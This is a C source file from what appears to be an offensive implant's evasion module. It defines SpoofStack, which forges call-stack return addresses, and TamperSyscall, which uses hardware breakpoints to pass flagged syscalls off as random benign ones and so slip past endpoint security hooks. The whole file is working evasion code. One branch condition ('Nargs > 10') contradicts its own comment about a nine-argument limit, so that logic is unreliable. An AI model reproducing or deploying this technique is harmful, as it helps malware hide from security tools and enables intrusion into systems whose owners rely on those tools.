//
// Created by Brendan Ortiz on 7/25/2024.
//

#include "../../../headers/agent/evasion/Common.h"

PVOID SpoofStack(
    _In_ PVOID pFunction,
    _In_ INT Nargs,
    _Inout_ PVOID a,
    _Inout_ PVOID b,
    _Inout_ PVOID c,
    _Inout_ PVOID d,
    _Inout_ PVOID e,
    _Inout_ PVOID f,
    _Inout_ PVOID g,
    _Inout_ PVOID h,
    _Inout_ PVOID j
   )
{
    Args args = {0};
    args.Nargs = Nargs;
    args.Arg01 = a;
    args.Arg02 = b;
    args.Arg03 = c;
    args.Arg04 = d;
    args.Arg05 = e;
    args.Arg06 = f;
    args.Arg07 = g;
    args.Arg08 = h;
    args.Arg09 = j;


    return SilentMoonwalkMain(pFunction, &args, agent->Walker->RetAddr);
}

NTSTATUS TamperSyscall(
    ULONG_PTR uAddress,
    UINT Nargs,
    ULONG_PTR a,
    ULONG_PTR b,
    ULONG_PTR c,
    ULONG_PTR d,
    ULONG_PTR e,
    ULONG_PTR f,
    ULONG_PTR g,
    ULONG_PTR h,
    ULONG_PTR i,
    ULONG_PTR j,
    ULONG_PTR k
    ) {

    DWORD SSN = 0x00;
    SSN = FetchSSNFromSyscallEntriesViaAddress(uAddress);
    BOOL BENIGN = FALSE;

    NTSTATUS            NtStatus = 0x00;
    t_NtDummyApi        pDummyApi = NULL;

    for(int i = 0; i < g_BenignSyscallList->u32Count; i++) {
        if(g_BenignSyscallList->Entries[i].SSN == SSN) {
            BENIGN = TRUE;
            break;
        }
    }

    if(!BENIGN) {
        if(!InitHardwareBreakpointHooking()) {
            printf("[error] intializing hardware breakpoints\n");
            return -1;
        }

        pDummyApi = (t_NtDummyApi)g_BenignSyscallList->Entries[GenerateRandomNumber() % g_BenignSyscallList->u32Count].uAddress;
        if(!InitializeTamperedSyscall(pDummyApi, g_SyscallList->Entries[SSN].dw64Hash, Nargs, a, b, c, d, e, f, g, h, i, j, k)) {
            return -1;
        }

        if((NtStatus = SpoofStack(pDummyApi, Nargs)) != 0x00) { // spoof the stack and call the api using NULL args, we've already setup the args in the tampered syscall.
            printf("[!] 0x%llx Failed With Error: 0x%llx \n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
            return NtStatus;
        }

        if(!HaltHardwareBreakpointHooking()) {
            printf("[error] attempting to halt hardware breakpoints\n");
            return -1;
        }
    } else { // FUNCTION IS UNHOOKED WHY BOTHER SETING HARDWARE BP & SPOOFING ARGS AT ALL?
       // we should just spoof the stack and call the api. only supported for up to 9 args for now.
        if(Nargs > 10) {
            if ((NtStatus = SpoofStack(uAddress, Nargs, a, b, c, d, e, f, g, h, i)) != 0x00) {
                printf("[error] 0x%llx attempting to spoof stack for syscall: 0x%llx\n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
                return NtStatus;
            }
        }
    }

    return NtStatus;
}